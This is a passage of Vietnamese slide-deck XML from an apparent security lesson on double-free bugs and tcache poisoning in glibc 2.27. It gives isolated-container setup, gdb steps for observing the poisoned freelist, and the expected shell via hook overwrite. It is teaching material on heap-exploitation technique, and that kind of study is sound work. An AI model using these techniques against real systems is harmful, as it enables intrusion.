        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="3703320"/>
            <a:ext cx="2281428" cy="68580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tcache dup → poisoning</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="4434840"/>
            <a:ext cx="2281428" cy="167335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Biến lỗi thành primitive: arbitrary allocation, ghi đè hook/con trỏ hàm, FSOP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Shape 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9084564" y="3246120"/>
            <a:ext cx="2647188" cy="2971800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2763"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Text 29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9267444" y="341071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THỰC TẾ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Text 30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9267444" y="3703320"/>
            <a:ext cx="2281428" cy="68580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CVE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Text 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9267444" y="4434840"/>
            <a:ext cx="2281428" cy="167335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Mỗi CVE là một lỗi CWE-415 cụ thể trong sản phẩm: IKEEXT, mod_http2, Windows Kernel</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="13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731520" y="640080"/>
            <a:ext cx="4572000" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="14000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>05</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="14000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="100" type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="3063240"/>
            <a:ext cx="6949440" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Demo khai thác</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="101" type="body" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="4343400"/>
            <a:ext cx="6949440" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Yêu cầu 6 · PoC Sink A / Sink B trên glibc 2.27, hai hướng: thủ công và có AI hỗ trợ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="914400"/>
            <a:ext cx="3593592" cy="5120640"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2036"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8366760" y="1143000"/>
            <a:ext cx="3108960" cy="27432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NỘI DUNG</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8366760" y="1554480"/>
            <a:ext cx="3154680" cy="4297680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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Môi trường cô lập</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Hướng 1: thủ công</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Hướng 2: có AI hỗ trợ</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Môi trường demo cô lập</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6 · MỤC TIÊU: POC SINK A / SINK B (5.5)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="6035040" cy="2834640"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2581"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1527048"/>
            <a:ext cx="5669280" cy="22860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[Máy demo] container glibc 2.27, không mạng</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1828800"/>
            <a:ext cx="5669280" cy="2331720"/>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 Dockerfile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FROM ubuntu:18.04</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RUN apt-get update &amp;&amp; apt-get install -y gcc gdb</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docker build -t hdf-lab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docker run --rm -it --network none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-v "$PWD":/w -w /w hdf-lab</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ldd --version | head -1      # GLIBC 2.27</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gcc -g -o sinkA sinkA.c &amp;&amp; ./sinkA AAAA</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="4480560"/>
            <a:ext cx="6035040" cy="1737360"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4211"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4645152"/>
            <a:ext cx="5669280"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AN TOÀN</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4937760"/>
            <a:ext cx="5669280" cy="1170432"/>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bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Chỉ chạy PoC tự viết trong container, </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>--network none</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Không đụng hệ thống thật hay dịch vụ bên ngoài</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="1417320"/>
            <a:ext cx="5010912" cy="2194560"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3333"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="1581912"/>
            <a:ext cx="4645152"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MONG ĐỢI TRÊN GLIBC 2.27</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="1874520"/>
            <a:ext cx="4645152" cy="1627632"/>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chemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Sink A in </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>[win] chiem duoc luong thuc thi qua tcache poisoning</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> rồi mở </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>/bin/sh</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Sink B mở shell qua </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>system("/bin/sh")</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="3840480"/>
            <a:ext cx="5010912" cy="2377440"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3077"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="4005072"/>
            <a:ext cx="4645152" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>NHÁNH HỎNG HAY GẶP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="4297680"/>
            <a:ext cx="4645152" cy="181051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bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>glibc ≥ 2.29: </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>free(): double free detected in tcache 2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>glibc ≥ 2.34, Sink B: </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>undefined reference</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> tới </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>__free_hook</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Sai địa chỉ hook: segfault hoặc </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>malloc(): unaligned tcache chunk detected</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="12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Hướng 1: phân tích thủ công bằng gdb</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6 · QUAN SÁT TCACHE TRỰC TIẾP TRONG BỘ NHỚ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="6035040" cy="4800600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1524"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1527048"/>
            <a:ext cx="5669280" cy="22860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[Trong container] gdb ./sinkA</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1828800"/>
            <a:ext cx="5669280" cy="4297680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>(gdb) break free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(gdb) run AAAA</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(gdb) finish             # về main sau mỗi free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(gdb) p h</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(gdb) x/2gx h            # qword 1 = next, 2 = key</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2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t># sau free(h) lần 2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>(gdb) x/2gx h            # next == h: self-loop</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(gdb) watch *(long *)h   # bắt UAF write</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(gdb) continue</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>(gdb) x/2gx h            # next == t: poisoned</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(gdb) p fake == t        # malloc #2 trả về t</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(gdb) p t-&gt;action        # = win</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="1417320"/>
            <a:ext cx="5010912" cy="1028700"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="1581912"/>
            <a:ext cx="464515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1 · KHOANH VÙNG</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="1874520"/>
            <a:ext cx="4645152" cy="46177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Đọc source, tìm free(h) không NULL hoá; tính 248 → chunk 0x100 → idx 14</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="2674620"/>
            <a:ext cx="5010912" cy="1028700"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="2839212"/>
            <a:ext cx="464515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2 · QUAN SÁT SELF-LOOP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
